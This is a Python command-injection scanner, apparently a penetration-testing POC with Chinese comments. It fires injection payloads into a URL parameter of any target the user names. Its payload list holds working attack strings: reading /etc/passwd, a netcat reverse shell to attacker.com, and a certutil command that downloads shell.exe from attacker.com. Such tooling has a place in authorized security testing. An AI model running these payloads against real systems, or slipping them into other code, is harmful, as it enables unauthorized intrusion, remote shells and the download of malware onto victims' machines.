#!/usr/bin/env python3
"""
命令注入漏洞 POC 库
检测常见的命令注入点：ping、traceroute、nslookup、诊断工具等
"""
import argparse, sys, time, urllib.parse
sys.path.insert(0, '..')
from utils.http import detect_cmd_injection, http_get, http_post

PAYLOADS = {
    "linux": [
        "| whoami",
        "; whoami",
        "& whoami",
        "`id`",
        "$(cat /etc/passwd)",
        "|| ping -c 1 attacker.com",
        "&& sleep 5",
        "| nc attacker.com 4444 -e /bin/bash",
    ],
    "windows": [
        "| whoami",
        "; whoami",
        "& dir",
        "|| ping -n 1 attacker.com",
        "&& timeout /t 5",
        "| certutil -urlcache -f http://attacker.com/shell.exe",
    ],
}

def scan_cmd_injection(url, param="cmd", method="GET"):
    print(f"\n[*] 扫描命令注入: {url}")
    for os_type, payloads in PAYLOADS.items():
        print(f"  [{os_type} payloads]")
        for p in payloads[:3]:  # 限制数量避免超时
            target = f"{url.split('?')[0]}?{param}={urllib.parse.quote(p)}"
            try:
                start = time.time()
                http_get(target, timeout=8)
                elapsed = time.time() - start
                # 盲测: sleep 命令
                if "sleep" in p.lower():
                    if elapsed >= 4:
                        print(f"    [!] 延迟 {elapsed:.1f}s → 可能存在注入 (payload: {p})")
                else:
                    print(f"    [→] {p}")
            except Exception as e:
                print(f"    [×] {p} ({str(e)[:30]})")

def main():
    parser = argparse.ArgumentParser(description="命令注入漏洞扫描")
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-p", "--param", default="cmd", help="参数名")
    args = parser.parse_args()
    scan_cmd_injection(args.target, args.param)

if __name__ == "__main__":
    main()
